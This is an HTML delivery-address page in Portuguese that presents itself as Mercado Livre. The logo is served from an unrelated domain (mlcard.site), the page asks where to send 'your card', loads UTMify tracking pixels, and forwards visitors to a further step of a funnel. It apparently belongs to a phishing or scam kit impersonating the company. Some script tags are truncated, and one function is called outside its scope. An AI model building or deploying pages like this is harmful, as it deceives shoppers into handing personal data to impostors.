<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Endereço de Entrega</title>
    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>

        src="https://cdn.utmify.com.br/scripts/utms/latest.js"
        data-utmify-prevent-subids
        async
        defer
    ></script>

        a.setAttribute("async", "");

        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Sora', sans-serif;
            background-color: #f5f5f5;
        }

        .header {
            display: flex;
            align-items: center;
            padding: 10px;
            border-bottom: 1px solid #aa9900;
            background-color: #FFE600;
        }
        .logo {
            width: 125px;
            margin-left: 20px;
            padding: 10px;
        }

        .content {
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
        }

        h1 {
            color: #333;
            font-size: 24px;
            margin-bottom: 10px;
            text-align: center;
        }

        .subtitle {
            color: #666;
            font-size: 16px;
            margin-bottom: 20px;
            text-align: center;
        }

        .form-group {
            margin-bottom: 15px;
        }

        .form-row {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }

        .form-col {
            flex: 1;
        }

        label {
            display: block;
            margin-bottom: 3px;
            color: #333;
            font-size: 13px;
        }

        input[type="text"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 15px;
            font-family: 'Sora', sans-serif;
        }

        .checkbox-group {
            display: flex;
            align-items: center;
            margin-top: 5px;
        }

        .checkbox-group input[type="checkbox"] {
            margin-right: 8px;
        }

        button {
            width: 100%;
            padding: 15px;
            background-color: #FFE600;
            color: #1c1c1c;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            font-family: 'Sora', sans-serif;
            box-shadow: 0 4px 8px rgba(255,230,0,0.3);
            transition: all 0.3s ease;
            margin-top: 10px;
        }

        button:hover {
            background-color: #e6cf00;
        }

        button:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }

        .estado-select {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 15px;
            font-family: 'Sora', sans-serif;
            background-color: white;
        }

        .loading {
            color: #666;
            font-style: italic;
        }

        .error-message {
            color: #dc3545;
            font-size: 14px;
            margin-top: 5px;
            animation: fadeIn 0.3s;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="header">
        <img src="https://mlcard.site/1/logo.png" alt="Logo Mercado Livre" class="logo">
    </div>

    <div class="content">
        <h1>Endereço de Entrega</h1>
        <p class="subtitle">Onde você deseja receber seu cartão</p>

        <form id="endereco-form" onsubmit="event.preventDefault(); salvarEndereco();">
            <div class="form-group">
                <label for="cep">CEP</label>
                <input type="text" id="cep" name="cep" maxlength="9" placeholder="00000-000" required>
                <small style="color: #666;">Digite o CEP e aguarde o preenchimento automático</small>
            </div>
            
            <div class="form-group">
                <label for="endereco">Endereço</label>
                <input type="text" id="endereco" name="endereco" required>
            </div>
            
            <div class="form-row">
                <div class="form-col" style="flex: 0.4;">
                    <label for="numero">Número</label>
                    <input type="text" id="numero" name="numero" required>
                </div>
                <div class="form-col" style="flex: 0.6;">
                    <label for="complemento">Complemento (opcional)</label>
                    <input type="text" id="complemento" name="complemento">
                </div>
            </div>
            
            <div class="form-group">
                <label for="bairro">Bairro</label>
                <input type="text" id="bairro" name="bairro" required>
            </div>
            
            <div class="form-row">
                <div class="form-col" style="flex: 0.6;">
                    <label for="cidade">Cidade</label>
                    <input type="text" id="cidade" name="cidade" required>
                </div>
                <div class="form-col" style="flex: 0.4;">
                    <label for="estado">Estado</label>
                    <select id="estado" name="estado" class="estado-select" required>
                        <option value="">Selecione</option>
                        <option value="AC">AC</option>
                        <option value="AL">AL</option>
                        <option value="AP">AP</option>
                        <option value="AM">AM</option>
                        <option value="BA">BA</option>
                        <option value="CE">CE</option>
                        <option value="DF">DF</option>
                        <option value="ES">ES</option>
                        <option value="GO">GO</option>
                        <option value="MA">MA</option>
                        <option value="MT">MT</option>
                        <option value="MS">MS</option>
                        <option value="MG">MG</option>
                        <option value="PA">PA</option>
                        <option value="PB">PB</option>
                        <option value="PR">PR</option>
                        <option value="PE">PE</option>
                        <option value="PI">PI</option>
                        <option value="RJ">RJ</option>
                        <option value="RN">RN</option>
                        <option value="RS">RS</option>
                        <option value="RO">RO</option>
                        <option value="RR">RR</option>
                        <option value="SC">SC</option>
                        <option value="SP">SP</option>
                        <option value="SE">SE</option>
                        <option value="TO">TO</option>
                    </select>
                </div>
            </div>

            <button type="submit" id="submit-btn" class="button">
                Continuar
            </button>
        </form>
    </div>

    <footer style="padding: 10px 15px; text-align: center; margin-top: 50px; background-color: #f9f9f9; border-top: 1px solid #eaeaea; font-family: 'Sora', sans-serif;">
        <div style="max-width: 600px; margin: 0 auto;">
            <p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">
                Mercado Livre S.A. | CNPJ: 79.379.491/0008-50
            </p>
            <p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">
                Rod. Antônio Heil, 250 - Centro II, Brusque - SC, 88353-100
            </p>
            <p style="color: #999; font-size: 9px; margin-top: 5px;">
                © 2025 - Todos os direitos reservados
            </p>
        </div>
    </footer>

    <script>
        $(document).ready(function() {
            // Máscara para o CEP
            $('#cep').mask('00000-000');
            
            // Função para limpar o formulário
            function limpaFormulario() {
                $("#endereco").val("");
                $("#bairro").val("");
                $("#cidade").val("");
                $("#estado").val("");
            }
            
            // Função para mostrar mensagem de erro
            function showErrorMessage(message) {
                $(".error-message").remove();
                $("#cep").after(`<div class="error-message">${message}</div>`);
                setTimeout(function() {
                    $(".error-message").fadeOut(400, function() {
                        $(this).remove();
                    });
                }, 3000);
            }
            
            // Busca CEP quando o campo perde o foco
            $("#cep").blur(function() {
                var cep = $(this).val().replace(/\D/g, '');
                
                if (cep.length === 8) {
                    // Mostra estado de carregamento
                    $("#endereco").val("Buscando...").addClass("loading");
                    $("#bairro").val("Buscando...").addClass("loading");
                    $("#cidade").val("Buscando...").addClass("loading");
                    $("#estado").val("Buscando...");
                    
                    // Faz a requisição para a API ViaCEP
                    fetch(`https://viacep.com.br/ws/${cep}/json/`)
                        .then(response => {
                            if (!response.ok) {
                                throw new Error('Erro na conexão com o serviço de CEP');
                            }
                            return response.json();
                        })
                        .then(dados => {
                            if (dados.erro) {
                                throw new Error('CEP não encontrado');
                            }
                            
                            // Preenche os campos com os dados retornados
                            $("#endereco").val(dados.logradouro || "").removeClass("loading");
                            $("#bairro").val(dados.bairro || "").removeClass("loading");
                            $("#cidade").val(dados.localidade || "").removeClass("loading");
                            $("#estado").val(dados.uf || "");
                            
                            // Foca automaticamente no campo número
                            if (dados.logradouro) {
                                $("#numero").focus();
                            }
                        })
                        .catch(error => {
                            limpaFormulario();
                            showErrorMessage(error.message);
                        });
                } else if (cep.length > 0) {
                    limpaFormulario();
                    showErrorMessage("CEP incompleto. Digite os 8 dígitos.");
                }
            });
        });

        function salvarEndereco() {
            // Validação básica dos campos
            if (!$("#endereco").val() || !$("#numero").val() || !$("#bairro").val() || !$("#cidade").val() || !$("#estado").val()) {
                showErrorMessage("Por favor, preencha todos os campos obrigatórios.");
                return;
            }

            const endereco = {
                logradouro: $("#endereco").val(),
                numero: $("#numero").val(),
                complemento: $("#complemento").val(),
                bairro: $("#bairro").val(),
                cidade: $("#cidade").val(),
                estado: $("#estado").val(),
                cep: $("#cep").val()
            };

            try {
                localStorage.setItem('enderecoEntrega', JSON.stringify(endereco));
                console.log('Endereço salvo com sucesso:', endereco);
                
                // Desabilita o botão para evitar múltiplos cliques
                $("#submit-btn").prop("disabled", true).text("Processando...");
                
                // Redireciona após um pequeno delay
                setTimeout(() => {
                    window.location.href = buildUrlWithParams('../12-2/index-2.html');
                }, 500);
            } catch (erro) {
                console.error('Erro ao salvar endereço:', erro);
                showErrorMessage('Ocorreu um erro ao salvar o endereço. Por favor, tente novamente.');
                $("#submit-btn").prop("disabled", false).text("Continuar");
            }
        }

        function getUrlParams() {
            const params = {};
            const queryString = window.location.search;
            const urlParams = new URLSearchParams(queryString);
            
            for (const [key, value] of urlParams) {
                params[key] = value;
            }
            return params;
        }

        function buildUrlWithParams(baseUrl) {
            const params = getUrlParams();
            const url = new URL(baseUrl, window.location.href);
            Object.keys(params).forEach(key => {
                url.searchParams.append(key, params[key]);
            });
            
            return url.toString();
        }
    </script>
</body>
</html>
